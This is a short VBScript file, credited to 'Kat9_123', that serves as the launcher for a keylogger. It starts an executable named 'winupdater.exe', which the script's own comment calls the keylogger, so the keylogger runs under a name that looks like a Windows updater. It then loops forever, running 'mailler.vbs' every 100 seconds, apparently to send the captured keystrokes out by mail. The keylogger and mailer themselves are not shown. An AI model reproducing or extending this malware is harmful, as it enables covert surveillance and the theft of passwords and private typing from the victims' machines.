 
 'By: Kat9_123
 
 
Set shell=CreateObject("WScript.Shell") 'Sets the shell

shell.Run "winupdater.exe" 'Starts the keylogger

do 'Start of loop
WScript.Sleep(100000) 'Waits 100 seconds (1000 is 1 second)
shell.Run "mailler.vbs" 'Starts mailler.vbs'
loop 'End of loop